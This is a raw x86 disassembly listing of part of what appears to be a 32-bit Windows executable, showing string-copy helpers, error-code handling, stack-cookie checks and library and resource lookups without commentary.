  4044d2:	mov    eax,DWORD PTR [ecx]
  4044d4:	cmp    eax,DWORD PTR [edx]
  4044d6:	jne    0x4044f4
  4044d8:	mov    eax,DWORD PTR [ecx+0x4]
  4044db:	cmp    eax,DWORD PTR [edx+0x4]
  4044de:	jne    0x4044f4
  4044e0:	mov    eax,DWORD PTR [ecx+0x8]
  4044e3:	cmp    eax,DWORD PTR [edx+0x8]
  4044e6:	jne    0x4044f4
  4044e8:	mov    eax,DWORD PTR [ecx+0xc]
  4044eb:	cmp    eax,DWORD PTR [edx+0xc]
  4044ee:	jne    0x4044f4
  4044f0:	xor    eax,eax
  4044f2:	inc    eax
  4044f3:	ret    
  4044f4:	xor    eax,eax
  4044f6:	ret    
  4044f7:	int3   
  4044f8:	int3   
  4044f9:	int3   
  4044fa:	int3   
  4044fb:	int3   
  4044fc:	mov    edi,edi
  4044fe:	push   ebp
  4044ff:	mov    ebp,esp
  404501:	push   esi
  404502:	xor    esi,esi
  404504:	mov    eax,0x80070057
  404509:	push   edi
  40450a:	test   edx,edx
  40450c:	je     0x404516
  40450e:	cmp    edx,0x7fffffff
  404514:	jbe    0x404518
  404516:	mov    esi,eax
  404518:	test   esi,esi
  40451a:	js     0x404563
  40451c:	mov    edi,DWORD PTR [ebp+0xc]
  40451f:	cmp    edi,0x7ffffffe
  404525:	jbe    0x40452b
  404527:	mov    esi,eax
  404529:	jmp    0x404567
  40452b:	xor    esi,esi
  40452d:	test   edx,edx
  40452f:	je     0x404559
  404531:	push   ebx
  404532:	mov    ebx,DWORD PTR [ebp+0x8]
  404535:	sub    edi,edx
  404537:	sub    ebx,ecx
  404539:	lea    eax,[edi+edx*1]
  40453c:	test   eax,eax
  40453e:	je     0x404554
  404540:	movzx  eax,WORD PTR [ebx+ecx*1]
  404544:	test   ax,ax
  404547:	je     0x404554
  404549:	mov    WORD PTR [ecx],ax
  40454c:	add    ecx,0x2
  40454f:	sub    edx,0x1
  404552:	jne    0x404539
  404554:	pop    ebx
  404555:	test   edx,edx
  404557:	jne    0x404567
  404559:	sub    ecx,0x2
  40455c:	mov    esi,0x8007007a
  404561:	jmp    0x404567
  404563:	test   edx,edx
  404565:	je     0x40456c
  404567:	xor    eax,eax
  404569:	mov    WORD PTR [ecx],ax
  40456c:	pop    edi
  40456d:	mov    eax,esi
  40456f:	pop    esi
  404570:	pop    ebp
  404571:	ret    0x8
  404574:	int3   
  404575:	int3   
  404576:	int3   
  404577:	int3   
  404578:	int3   
  404579:	mov    ecx,DWORD PTR ds:0x4094c8
  40457f:	mov    eax,ecx
  404581:	mov    edx,DWORD PTR ds:0x4094cc
  404587:	or     eax,edx
  404589:	jne    0x40458c
  40458b:	ret    
  40458c:	push   edx
  40458d:	push   ecx
  40458e:	call   DWORD PTR ds:0x40a004
  404594:	and    DWORD PTR ds:0x4094c8,0x0
  40459b:	and    DWORD PTR ds:0x4094cc,0x0
  4045a2:	ret    
  4045a3:	int3   
  4045a4:	int3   
  4045a5:	int3   
  4045a6:	int3   
  4045a7:	int3   
  4045a8:	int3   
  4045a9:	int3   
  4045aa:	int3   
  4045ab:	int3   
  4045ac:	int3   
  4045ad:	int3   
  4045ae:	int3   
  4045af:	int3   
  4045b0:	mov    edi,edi
  4045b2:	push   ebp
  4045b3:	mov    ebp,esp
  4045b5:	push   edi
  4045b6:	mov    edi,DWORD PTR [ebp+0x28]
  4045b9:	test   edi,edi
  4045bb:	je     0x4046bc
  4045c1:	mov    eax,DWORD PTR [ebp+0xc]
  4045c4:	push   ebx
  4045c5:	xor    ebx,ebx
  4045c7:	sub    eax,ebx
  4045c9:	je     0x404682
  4045cf:	sub    eax,0x1
  4045d2:	jne    0x4046bb
  4045d8:	mov    al,BYTE PTR [ebp+0x10]
  4045db:	mov    BYTE PTR [edi+0x28],al
  4045de:	mov    eax,DWORD PTR [ebp+0x14]
  4045e1:	mov    DWORD PTR [edi+0x10],eax
  4045e4:	mov    eax,DWORD PTR [ebp+0x18]
  4045e7:	mov    DWORD PTR [edi+0x14],eax
  4045ea:	mov    eax,DWORD PTR [ebp+0x1c]
  4045ed:	mov    DWORD PTR [edi+0x18],eax
  4045f0:	mov    eax,DWORD PTR [ebp+0x20]
  4045f3:	mov    DWORD PTR [edi+0x1c],eax
  4045f6:	xor    eax,eax
  4045f8:	mov    DWORD PTR [edi+0x24],0x1
  4045ff:	cmp    ax,WORD PTR [edi+0x2a]
  404603:	jae    0x4046bb
  404609:	push   esi
  40460a:	mov    eax,DWORD PTR [edi+0x30]
  40460d:	mov    cl,BYTE PTR [edi+0x28]
  404610:	mov    edx,DWORD PTR [eax+ebx*8]
  404613:	mov    esi,DWORD PTR [eax+ebx*8+0x4]
  404617:	mov    eax,DWORD PTR [edi+0x34]
  40461a:	cmp    BYTE PTR [ebx+eax*1],cl
  40461d:	jbe    0x404623
  40461f:	test   cl,cl
  404621:	jne    0x40464b
  404623:	mov    eax,edx
  404625:	or     eax,esi
  404627:	je     0x404660
  404629:	mov    ecx,DWORD PTR [edi+0x10]
  40462c:	mov    eax,DWORD PTR [edi+0x14]
  40462f:	and    ecx,edx
  404631:	and    eax,esi
  404633:	or     ecx,eax
  404635:	je     0x40464b
  404637:	mov    eax,DWORD PTR [edi+0x18]
  40463a:	mov    ecx,DWORD PTR [edi+0x1c]
  40463d:	and    eax,edx
  40463f:	and    ecx,esi
  404641:	cmp    eax,DWORD PTR [edi+0x18]
  404644:	jne    0x40464b
  404646:	cmp    ecx,DWORD PTR [edi+0x1c]
  404649:	je     0x404660
  40464b:	mov    edx,DWORD PTR [edi+0x2c]
  40464e:	mov    esi,ebx
  404650:	shr    esi,0x5
  404653:	mov    ecx,ebx
  404655:	and    ecx,0x1f
  404658:	mov    eax,DWORD PTR [edx+esi*4]
  40465b:	btr    eax,ecx
  40465e:	jmp    0x404673
  404660:	mov    edx,DWORD PTR [edi+0x2c]
  404663:	mov    esi,ebx
  404665:	shr    esi,0x5
  404668:	mov    ecx,ebx
  40466a:	and    ecx,0x1f
  40466d:	mov    eax,DWORD PTR [edx+esi*4]
  404670:	bts    eax,ecx
  404673:	mov    DWORD PTR [edx+esi*4],eax
  404676:	inc    ebx
  404677:	movzx  eax,WORD PTR [edi+0x2a]
  40467b:	cmp    ebx,eax
  40467d:	jb     0x40460a
  40467f:	pop    esi
  404680:	jmp    0x4046bb
  404682:	movzx  eax,WORD PTR [edi+0x2a]
  404686:	mov    DWORD PTR [edi+0x24],ebx
  404689:	mov    BYTE PTR [edi+0x28],bl
  40468c:	mov    DWORD PTR [edi+0x10],ebx
  40468f:	mov    DWORD PTR [edi+0x14],ebx
  404692:	mov    DWORD PTR [edi+0x18],ebx
  404695:	mov    DWORD PTR [edi+0x1c],ebx
  404698:	test   ax,ax
  40469b:	je     0x4046bb
  40469d:	dec    eax
  40469e:	cdq    
  40469f:	and    edx,0x1f
  4046a2:	add    eax,edx
  4046a4:	sar    eax,0x5
  4046a7:	lea    eax,[eax*4+0x4]
  4046ae:	push   eax
  4046af:	push   ebx
  4046b0:	push   DWORD PTR [edi+0x2c]
  4046b3:	call   0x4070f0
  4046b8:	add    esp,0xc
  4046bb:	pop    ebx
  4046bc:	pop    edi
  4046bd:	pop    ebp
  4046be:	ret    0x24
  4046c1:	int3   
  4046c2:	int3   
  4046c3:	int3   
  4046c4:	int3   
  4046c5:	int3   
  4046c6:	mov    eax,ds:0x4094c8
  4046cb:	or     eax,DWORD PTR ds:0x4094cc
  4046d1:	je     0x4046d7
  4046d3:	xor    eax,eax
  4046d5:	jmp    0x4046f1
  4046d7:	push   0x4094c8
  4046dc:	push   0x409018
  4046e1:	push   0x4045b0
  4046e6:	push   0x402100
  4046eb:	call   DWORD PTR ds:0x40a000
  4046f1:	ret    0x8
  4046f4:	int3   
  4046f5:	int3   
  4046f6:	int3   
  4046f7:	int3   
  4046f8:	int3   
  4046f9:	push   0x0
  4046fb:	push   0x0
  4046fd:	push   ecx
  4046fe:	push   DWORD PTR ds:0x4094cc
  404704:	push   DWORD PTR ds:0x4094c8
  40470a:	call   DWORD PTR ds:0x40a008
  404710:	ret    0x8
  404713:	int3   
  404714:	int3   
  404715:	int3   
  404716:	int3   
  404717:	int3   
  404718:	mov    edi,edi
  40471a:	push   ebp
  40471b:	mov    ebp,esp
  40471d:	sub    esp,0x20
  404720:	mov    eax,ds:0x409004
  404725:	xor    eax,ebp
  404727:	mov    DWORD PTR [ebp-0x4],eax
  40472a:	and    DWORD PTR [ebp-0x14],0x0
  40472e:	lea    eax,[ebp-0x1c]
  404731:	and    DWORD PTR [ebp-0xc],0x0
  404735:	mov    DWORD PTR [ebp-0x18],eax
  404738:	lea    eax,[ebp-0x18]
  40473b:	push   eax
  40473c:	push   0x1
  40473e:	push   ecx
  40473f:	push   DWORD PTR ds:0x4094cc
  404745:	mov    DWORD PTR [ebp-0x1c],edx
  404748:	push   DWORD PTR ds:0x4094c8
  40474e:	mov    DWORD PTR [ebp-0x10],0x4
  404755:	call   DWORD PTR ds:0x40a008
  40475b:	mov    ecx,DWORD PTR [ebp-0x4]
  40475e:	xor    ecx,ebp
  404760:	call   0x405d80
  404765:	mov    esp,ebp
  404767:	pop    ebp
  404768:	ret    0x8
  40476b:	int3   
  40476c:	int3   
  40476d:	int3   
  40476e:	int3   
  40476f:	int3   
  404770:	cmp    DWORD PTR [ecx+0x4],0x0
  404774:	je     0x40477a
  404776:	and    DWORD PTR [ecx+0x4],0x0
  40477a:	ret    0x4
  40477d:	int3   
  40477e:	int3   
  40477f:	int3   
  404780:	int3   
  404781:	int3   
  404782:	mov    edi,edi
  404784:	push   ebp
  404785:	mov    ebp,esp
  404787:	push   esi
  404788:	mov    eax,ecx
  40478a:	push   0x2
  40478c:	pop    ecx
  40478d:	mul    ecx
  40478f:	xor    ecx,ecx
  404791:	mov    esi,eax
  404793:	cmp    edx,ecx
  404795:	ja     0x4047a5
  404797:	jb     0x40479e
  404799:	cmp    esi,0xffffffff
  40479c:	ja     0x4047a5
  40479e:	mov    eax,DWORD PTR [ebp+0x8]
  4047a1:	mov    DWORD PTR [eax],esi
  4047a3:	jmp    0x4047b0
  4047a5:	mov    eax,DWORD PTR [ebp+0x8]
  4047a8:	mov    ecx,0x80070216
  4047ad:	or     DWORD PTR [eax],0xffffffff
  4047b0:	mov    eax,ecx
  4047b2:	pop    esi
  4047b3:	pop    ebp
  4047b4:	ret    0x4
  4047b7:	int3   
  4047b8:	int3   
  4047b9:	int3   
  4047ba:	int3   
  4047bb:	int3   
  4047bc:	mov    edi,edi
  4047be:	push   ebp
  4047bf:	mov    ebp,esp
  4047c1:	push   ecx
  4047c2:	push   ebx
  4047c3:	push   esi
  4047c4:	push   edi
  4047c5:	mov    edi,edx
  4047c7:	mov    ebx,ecx
  4047c9:	xor    edx,edx
  4047cb:	mov    eax,0x80070057
  4047d0:	mov    esi,edx
  4047d2:	test   ebx,ebx
  4047d4:	jne    0x4047da
  4047d6:	test   edi,edi
  4047d8:	jne    0x4047e2
  4047da:	cmp    edi,0x7fffffff
  4047e0:	jbe    0x4047e4
  4047e2:	mov    esi,eax
  4047e4:	test   esi,esi
  4047e6:	js     0x4047f5
  4047e8:	mov    ecx,DWORD PTR [ebp+0xc]
  4047eb:	cmp    ecx,0x7fffffff
  4047f1:	jb     0x404809
  4047f3:	mov    esi,eax
  4047f5:	test   edi,edi
  4047f7:	je     0x4047fe
  4047f9:	xor    eax,eax
  4047fb:	mov    WORD PTR [ebx],ax
  4047fe:	pop    edi
  4047ff:	mov    eax,esi
  404801:	pop    esi
  404802:	pop    ebx
  404803:	mov    esp,ebp
  404805:	pop    ebp
  404806:	ret    0x14
  404809:	mov    eax,DWORD PTR [ebp+0x8]
  40480c:	test   eax,eax
  40480e:	jne    0x404817
  404810:	mov    eax,0x4027b4
  404815:	mov    ecx,edx
  404817:	mov    esi,edx
  404819:	test   edi,edi
  40481b:	jne    0x404837
  40481d:	test   ecx,ecx
  40481f:	je     0x4047fe
  404821:	cmp    WORD PTR [eax],dx
  404824:	je     0x4047fe
  404826:	mov    esi,ebx
  404828:	neg    esi
  40482a:	sbb    esi,esi
  40482c:	and    esi,0x23
  40482f:	add    esi,0x80070057
  404835:	jmp    0x4047fe
  404837:	push   ecx
  404838:	push   eax
  404839:	lea    eax,[ebp-0x4]
  40483c:	mov    DWORD PTR [ebp-0x4],edx
  40483f:	push   eax
  404840:	mov    edx,edi
  404842:	mov    ecx,ebx
  404844:	call   0x40487d
  404849:	mov    ecx,DWORD PTR [ebp-0x4]
  40484c:	mov    esi,eax
  40484e:	sub    edi,ecx
  404850:	test   esi,esi
  404852:	js     0x4047fe
  404854:	cmp    edi,0x1
  404857:	jbe    0x4047fe
  404859:	lea    eax,[edi+edi*1]
  40485c:	cmp    eax,0x2
  40485f:	jbe    0x4047fe
  404861:	add    eax,0xfffffffe
  404864:	push   eax
  404865:	lea    eax,[ecx+0x1]
  404868:	lea    eax,[ebx+eax*2]
  40486b:	push   0x0
  40486d:	push   eax
  40486e:	call   0x4070f0
  404873:	add    esp,0xc
  404876:	jmp    0x4047fe
  404878:	int3   
  404879:	int3   
  40487a:	int3   
  40487b:	int3   
  40487c:	int3   
  40487d:	mov    edi,edi
  40487f:	push   ebp
  404880:	mov    ebp,esp
  404882:	xor    eax,eax
  404884:	push   esi
  404885:	mov    esi,eax
  404887:	test   edx,edx
  404889:	je     0x4048b8
  40488b:	push   ebx
  40488c:	mov    ebx,DWORD PTR [ebp+0x10]
  40488f:	push   edi
  404890:	mov    edi,DWORD PTR [ebp+0xc]
  404893:	sub    edi,ecx
  404895:	test   ebx,ebx
  404897:	je     0x4048af
  404899:	movzx  eax,WORD PTR [edi+ecx*1]
  40489d:	test   ax,ax
  4048a0:	je     0x4048af
  4048a2:	mov    WORD PTR [ecx],ax
  4048a5:	add    ecx,0x2
  4048a8:	dec    ebx
  4048a9:	inc    esi
  4048aa:	sub    edx,0x1
  4048ad:	jne    0x404895
  4048af:	pop    edi
  4048b0:	pop    ebx
  4048b1:	push   0x0
  4048b3:	pop    eax
  4048b4:	test   edx,edx
  4048b6:	jne    0x4048c1
  4048b8:	sub    ecx,0x2
  4048bb:	mov    eax,0x8007007a
  4048c0:	dec    esi
  4048c1:	xor    edx,edx
  4048c3:	mov    WORD PTR [ecx],dx
  4048c6:	mov    ecx,DWORD PTR [ebp+0x8]
  4048c9:	test   ecx,ecx
  4048cb:	je     0x4048cf
  4048cd:	mov    DWORD PTR [ecx],esi
  4048cf:	pop    esi
  4048d0:	pop    ebp
  4048d1:	ret    0xc
  4048d4:	int3   
  4048d5:	int3   
  4048d6:	int3   
  4048d7:	int3   
  4048d8:	int3   
  4048d9:	mov    edi,edi
  4048db:	push   ebp
  4048dc:	mov    ebp,esp
  4048de:	push   ecx
  4048df:	push   ecx
  4048e0:	mov    eax,ds:0x409004
  4048e5:	xor    eax,ebp
  4048e7:	mov    DWORD PTR [ebp-0x4],eax
  4048ea:	push   edi
  4048eb:	mov    edi,edx
  4048ed:	test   cl,0x1
  4048f0:	je     0x404940
  4048f2:	push   ebx
  4048f3:	push   esi
  4048f4:	mov    esi,DWORD PTR [edi]
  4048f6:	lea    eax,[ebp-0x8]
  4048f9:	push   eax
  4048fa:	push   0x1
  4048fc:	xor    ebx,ebx
  4048fe:	call   DWORD PTR ds:0x40a070
  404904:	test   eax,eax
  404906:	js     0x404931
  404908:	mov    eax,DWORD PTR [ebp-0x8]
  40490b:	push   esi
  40490c:	push   eax
  40490d:	mov    ecx,DWORD PTR [eax]
  40490f:	mov    esi,DWORD PTR [ecx+0x18]
  404912:	mov    ecx,esi
  404914:	call   DWORD PTR ds:0x40a1ec
  40491a:	call   esi
  40491c:	mov    ecx,DWORD PTR [ebp-0x8]
  40491f:	mov    ebx,eax
  404921:	push   ecx
  404922:	mov    edx,DWORD PTR [ecx]
  404924:	mov    esi,DWORD PTR [edx+0x8]
  404927:	mov    ecx,esi
  404929:	call   DWORD PTR ds:0x40a1ec
  40492f:	call   esi
  404931:	push   ebx
  404932:	push   0x0
  404934:	push   DWORD PTR [edi]
  404936:	call   0x4070f0
  40493b:	add    esp,0xc
  40493e:	pop    esi
  40493f:	pop    ebx
  404940:	mov    ecx,DWORD PTR [ebp-0x4]
  404943:	xor    eax,eax
  404945:	xor    ecx,ebp
  404947:	pop    edi
  404948:	call   0x405d80
  40494d:	mov    esp,ebp
  40494f:	pop    ebp
  404950:	ret    
  404951:	int3   
  404952:	int3   
  404953:	int3   
  404954:	int3   
  404955:	int3   
  404956:	int3   
  404957:	int3   
  404958:	int3   
  404959:	int3   
  40495a:	int3   
  40495b:	int3   
  40495c:	int3   
  40495d:	int3   
  40495e:	int3   
  40495f:	int3   
  404960:	mov    edi,edi
  404962:	push   ebp
  404963:	mov    ebp,esp
  404965:	mov    eax,DWORD PTR [ebp+0x8]
  404968:	mov    ds:0x409534,eax
  40496d:	xor    eax,eax
  40496f:	inc    eax
  404970:	pop    ebp
  404971:	ret    0x4
  404974:	int3   
  404975:	int3   
  404976:	int3   
  404977:	int3   
  404978:	int3   
  404979:	int3   
  40497a:	int3   
  40497b:	int3   
  40497c:	int3   
  40497d:	int3   
  40497e:	int3   
  40497f:	int3   
  404980:	mov    edi,edi
  404982:	push   ebp
  404983:	mov    ebp,esp
  404985:	sub    esp,0x10c
  40498b:	mov    eax,ds:0x409004
  404990:	xor    eax,ebp
  404992:	mov    DWORD PTR [ebp-0x4],eax
  404995:	cmp    BYTE PTR ds:0x409530,0x0
  40499c:	push   edi
  40499d:	mov    edi,0x4094f0
  4049a2:	jne    0x404a4d
  4049a8:	push   esi
  4049a9:	push   0x40
  4049ab:	pop    esi
  4049ac:	push   esi
  4049ad:	push   0x0
  4049af:	push   edi
  4049b0:	call   0x4070f0
  4049b5:	and    DWORD PTR [ebp-0x10c],0x0
  4049bc:	lea    eax,[ebp-0x10c]
  4049c2:	add    esp,0xc
  4049c5:	push   eax
  4049c6:	push   0x404960
  4049cb:	push   0x6
  4049cd:	call   DWORD PTR ds:0x40a0b4
  4049d3:	test   eax,eax
  4049d5:	je     0x404a45
  4049d7:	push   0x104
  4049dc:	lea    eax,[ebp-0x108]
  4049e2:	push   eax
  4049e3:	push   DWORD PTR [ebp-0x10c]
  4049e9:	call   DWORD PTR ds:0x40a0cc
  4049ef:	test   eax,eax
  4049f1:	je     0x404a45
  4049f3:	lea    ecx,[ebp-0x108]
  4049f9:	lea    edx,[ecx+0x1]
  4049fc:	mov    al,BYTE PTR [ecx]
  4049fe:	inc    ecx
  4049ff:	test   al,al
  404a01:	jne    0x4049fc
  404a03:	sub    ecx,edx
  404a05:	lea    edx,[ebp-0x108]
  404a0b:	add    edx,ecx
  404a0d:	jmp    0x404a16
  404a0f:	cmp    BYTE PTR [edx-0x1],0x5c
  404a13:	je     0x404a20
  404a15:	dec    edx
  404a16:	lea    eax,[ebp-0x108]
  404a1c:	cmp    edx,eax
  404a1e:	ja     0x404a0f
  404a20:	mov    ecx,edi
  404a22:	sub    edx,edi
  404a24:	lea    eax,[esi+0x7fffffbe]
  404a2a:	test   eax,eax
  404a2c:	je     0x404a3d
  404a2e:	mov    al,BYTE PTR [edx+ecx*1]
  404a31:	test   al,al
  404a33:	je     0x404a3d
  404a35:	mov    BYTE PTR [ecx],al
  404a37:	inc    ecx
  404a38:	sub    esi,0x1
  404a3b:	jne    0x404a24
  404a3d:	test   esi,esi
  404a3f:	jne    0x404a42
  404a41:	dec    ecx
  404a42:	mov    BYTE PTR [ecx],0x0
  404a45:	mov    BYTE PTR ds:0x409530,0x1
  404a4c:	pop    esi
  404a4d:	mov    ecx,DWORD PTR [ebp-0x4]
  404a50:	mov    eax,edi
  404a52:	xor    ecx,ebp
  404a54:	pop    edi
  404a55:	call   0x405d80
  404a5a:	mov    esp,ebp
  404a5c:	pop    ebp
  404a5d:	ret    
  404a5e:	int3   
  404a5f:	int3   
  404a60:	int3   
  404a61:	int3   
  404a62:	int3   
  404a63:	int3   
  404a64:	int3   
  404a65:	int3   
  404a66:	int3   
  404a67:	int3   
  404a68:	int3   
  404a69:	int3   
  404a6a:	int3   
  404a6b:	int3   
  404a6c:	int3   
  404a6d:	int3   
  404a6e:	int3   
  404a6f:	int3   
  404a70:	mov    edi,edi
  404a72:	push   ebp
  404a73:	mov    ebp,esp
  404a75:	push   ecx
  404a76:	mov    eax,ds:0x409004
  404a7b:	xor    eax,ebp
  404a7d:	mov    DWORD PTR [ebp-0x4],eax
  404a80:	push   0x40282c
  404a85:	call   DWORD PTR ds:0x40a0c4
  404a8b:	test   eax,eax
  404a8d:	je     0x404aad
  404a8f:	push   esi
  404a90:	push   0x402840
  404a95:	push   eax
  404a96:	call   DWORD PTR ds:0x40a0c0
  404a9c:	mov    esi,eax
  404a9e:	test   esi,esi
  404aa0:	je     0x404aac
  404aa2:	mov    ecx,esi
  404aa4:	call   DWORD PTR ds:0x40a1ec
  404aaa:	call   esi
  404aac:	pop    esi
  404aad:	mov    ecx,DWORD PTR [ebp-0x4]
  404ab0:	xor    ecx,ebp
  404ab2:	call   0x405d80
  404ab7:	mov    esp,ebp
  404ab9:	pop    ebp
  404aba:	ret    
  404abb:	int3   
  404abc:	int3   
  404abd:	int3   
  404abe:	int3   
  404abf:	int3   
  404ac0:	mov    edi,edi
  404ac2:	push   ebp
  404ac3:	mov    ebp,esp
  404ac5:	push   ecx
  404ac6:	mov    eax,ds:0x409004
  404acb:	xor    eax,ebp
  404acd:	mov    DWORD PTR [ebp-0x4],eax
  404ad0:	push   esi
  404ad1:	mov    esi,DWORD PTR ds:0x4094ec
  404ad7:	push   edi
  404ad8:	test   esi,esi
  404ada:	jne    0x404b15
  404adc:	mov    eax,ds:0x4094e8
  404ae1:	xor    edi,edi
  404ae3:	test   eax,eax
  404ae5:	jne    0x404afd
  404ae7:	push   0x800
  404aec:	push   edi
  404aed:	push   0x40282c
  404af2:	call   DWORD PTR ds:0x40a0bc
  404af8:	mov    ds:0x4094e8,eax
  404afd:	push   0x40285c
  404b02:	push   eax
  404b03:	call   DWORD PTR ds:0x40a0c0
  404b09:	mov    esi,eax
  404b0b:	mov    DWORD PTR ds:0x4094ec,esi
  404b11:	test   esi,esi
  404b13:	je     0x404b24
  404b15:	push   DWORD PTR [ebp+0x8]
  404b18:	mov    ecx,esi
  404b1a:	call   DWORD PTR ds:0x40a1ec
  404b20:	call   esi
  404b22:	mov    edi,eax
  404b24:	mov    ecx,DWORD PTR [ebp-0x4]
  404b27:	mov    eax,edi
  404b29:	pop    edi
  404b2a:	xor    ecx,ebp
  404b2c:	pop    esi
  404b2d:	call   0x405d80
  404b32:	mov    esp,ebp
  404b34:	pop    ebp
  404b35:	ret    0x4
  404b38:	int3   
  404b39:	int3   
  404b3a:	int3   
  404b3b:	int3   
  404b3c:	int3   
  404b3d:	mov    edi,edi
  404b3f:	push   ebp
  404b40:	mov    ebp,esp
  404b42:	sub    esp,0x18
  404b45:	mov    ecx,DWORD PTR ds:0x4094d4
  404b4b:	xor    eax,eax
  404b4d:	push   ebx
  404b4e:	push   esi
  404b4f:	push   edi
  404b50:	mov    edi,edx
  404b52:	mov    DWORD PTR [ebp-0x10],eax
  404b55:	mov    edx,DWORD PTR [ebp+0x8]
  404b58:	mov    esi,eax
  404b5a:	push   eax
  404b5b:	mov    DWORD PTR [ebp-0xc],eax
  404b5e:	mov    ebx,0x80004005
  404b63:	mov    DWORD PTR [ebp-0x8],ecx
  404b66:	mov    DWORD PTR [edx],eax
  404b68:	mov    eax,edi
  404b6a:	shr    eax,0x4
  404b6d:	inc    eax
  404b6e:	mov    DWORD PTR [ebp-0x14],esi
  404b71:	movzx  eax,ax
  404b74:	push   eax
  404b75:	push   0x6
  404b77:	push   ecx
  404b78:	mov    DWORD PTR [ebp-0x4],ebx
  404b7b:	call   DWORD PTR ds:0x40a028
  404b81:	test   eax,eax
  404b83:	je     0x404bd7
  404b85:	push   eax
  404b86:	push   DWORD PTR [ebp-0x8]
  404b89:	call   DWORD PTR ds:0x40a024
  404b8f:	test   eax,eax
  404b91:	je     0x404bd7
  404b93:	push   eax
  404b94:	call   DWORD PTR ds:0x40a020
  404b9a:	mov    ecx,eax
  404b9c:	test   ecx,ecx
  404b9e:	je     0x404bd7
  404ba0:	and    edi,0xf
  404ba3:	jbe    0x404bb3
  404ba5:	movzx  eax,WORD PTR [ecx]
  404ba8:	lea    ecx,[ecx+eax*2]
  404bab:	add    ecx,0x2
  404bae:	sub    edi,0x1
  404bb1:	jne    0x404ba5
  404bb3:	movzx  eax,WORD PTR [ecx]
  404bb6:	test   ax,ax
  404bb9:	je     0x404bc0
  404bbb:	add    ecx,0x2
  404bbe:	jmp    0x404bc5
  404bc0:	mov    ecx,0x4027b4
  404bc5:	push   eax
  404bc6:	push   ecx
  404bc7:	lea    ecx,[ebp-0x14]
  404bca:	call   0x403fb2
  404bcf:	mov    esi,DWORD PTR [ebp-0x14]
  404bd2:	mov    ebx,eax
  404bd4:	mov    DWORD PTR [ebp-0x4],ebx
  404bd7:	test   ebx,ebx
  404bd9:	js     0x404c22
  404bdb:	xor    bl,bl
  404bdd:	xor    edi,edi
  404bdf:	test   bl,bl
  404be1:	jne    0x404c1f
  404be3:	push   DWORD PTR [edi+0x4027b8]
  404be9:	push   esi
  404bea:	call   DWORD PTR ds:0x40a1b4
  404bf0:	pop    ecx
  404bf1:	pop    ecx
  404bf2:	test   eax,eax
  404bf4:	je     0x404c05
  404bf6:	mov    edx,DWORD PTR [ebp+0x8]
  404bf9:	mov    ecx,esi
  404bfb:	call   0x404c3d
  404c00:	mov    DWORD PTR [ebp-0x4],eax
  404c03:	inc    bl
  404c05:	add    edi,0x4
  404c08:	cmp    edi,0xc
  404c0b:	jb     0x404bdf
  404c0d:	test   bl,bl
  404c0f:	mov    ebx,DWORD PTR [ebp-0x4]
  404c12:	jne    0x404c22
  404c14:	mov    edx,DWORD PTR [ebp+0x8]
  404c17:	mov    eax,esi
  404c19:	xor    esi,esi
  404c1b:	mov    DWORD PTR [edx],eax
  404c1d:	jmp    0x404c22
  404c1f:	mov    ebx,DWORD PTR [ebp-0x4]
  404c22:	test   esi,esi
  404c24:	je     0x404c2d
  404c26:	push   esi
  404c27:	call   DWORD PTR ds:0x40a088
  404c2d:	pop    edi
  404c2e:	pop    esi
  404c2f:	mov    eax,ebx
  404c31:	pop    ebx
  404c32:	mov    esp,ebp
  404c34:	pop    ebp
  404c35:	ret    0x4
  404c38:	int3   
  404c39:	int3   
  404c3a:	int3   
  404c3b:	int3   
  404c3c:	int3   
  404c3d:	mov    edi,edi
  404c3f:	push   ebp
  404c40:	mov    ebp,esp
  404c42:	sub    esp,0x27c
  404c48:	mov    eax,ds:0x409004
  404c4d:	xor    eax,ebp
  404c4f:	mov    DWORD PTR [ebp-0x4],eax
  404c52:	or     DWORD PTR [ebp-0x270],0xffffffff
  404c59:	mov    eax,ecx
  404c5b:	or     DWORD PTR [ebp-0x26c],0xffffffff
  404c62:	push   ebx
  404c63:	push   esi
  404c64:	push   edi
  404c65:	mov    DWORD PTR [ebp-0x260],eax
  404c6b:	mov    DWORD PTR [ebp-0x268],eax
  404c71:	xor    eax,eax
  404c73:	push   eax
  404c74:	mov    ebx,eax
  404c76:	mov    DWORD PTR [ebp-0x264],eax
  404c7c:	mov    DWORD PTR [edx],eax
  404c7e:	lea    eax,[ebp-0x210]
  404c84:	push   0x104
  404c89:	push   eax
  404c8a:	push   0x4027c8
  404c8f:	mov    DWORD PTR [ebp-0x278],edx
  404c95:	mov    DWORD PTR [ebp-0x274],ebx
  404c9b:	call   DWORD PTR ds:0x40a04c
  404ca1:	mov    edi,eax
  404ca3:	test   edi,edi
  404ca5:	js     0x404e5e
  404cab:	lea    ecx,[ebp-0x210]
  404cb1:	lea    edx,[ecx+0x2]
  404cb4:	mov    ax,WORD PTR [ecx]
  404cb7:	add    ecx,0x2
  404cba:	cmp    ax,bx
  404cbd:	jne    0x404cb4
  404cbf:	sub    ecx,edx
  404cc1:	lea    eax,[ebp-0x274]
  404cc7:	push   eax
  404cc8:	sar    ecx,1
  404cca:	lea    eax,[ebp-0x210]
  404cd0:	push   ecx
  404cd1:	push   ecx
  404cd2:	push   eax
  404cd3:	call   0x404ebd
  404cd8:	mov    ebx,DWORD PTR [ebp-0x274]
  404cde:	mov    edi,eax
  404ce0:	test   edi,edi
  404ce2:	js     0x404e5e
  404ce8:	xor    eax,eax
  404cea:	lea    ecx,[ebp-0x258]
  404cf0:	mov    BYTE PTR [ebp-0x25c],al
  404cf6:	lea    eax,[ebp-0x268]
  404cfc:	push   DWORD PTR [ebp-0x25c]
  404d02:	push   eax
  404d03:	call   0x404e81
  404d08:	xor    eax,eax
  404d0a:	mov    DWORD PTR [ebp-0x25c],ebx
  404d10:	mov    BYTE PTR [ebp-0x268],al
  404d16:	lea    ecx,[ebp-0x228]
  404d1c:	push   DWORD PTR [ebp-0x268]
  404d22:	lea    eax,[ebp-0x25c]
  404d28:	push   eax
  404d29:	call   0x404e81
  404d2e:	mov    edx,DWORD PTR [ebp-0x260]
  404d34:	xor    eax,eax
  404d36:	mov    esi,eax
  404d38:	test   edx,edx
  404d3a:	je     0x404d82
  404d3c:	mov    ecx,edx
  404d3e:	mov    DWORD PTR [ebp-0x25c],eax
  404d44:	lea    edi,[ecx+0x2]
  404d47:	mov    ax,WORD PTR [ecx]
  404d4a:	add    ecx,0x2
  404d4d:	cmp    ax,WORD PTR [ebp-0x264]
  404d54:	jne    0x404d47
  404d56:	sub    ecx,edi
  404d58:	lea    eax,[ebp-0x25c]
  404d5e:	push   eax
  404d5f:	sar    ecx,1
  404d61:	push   ecx
  404d62:	push   edx
  404d63:	call   DWORD PTR ds:0x40a144
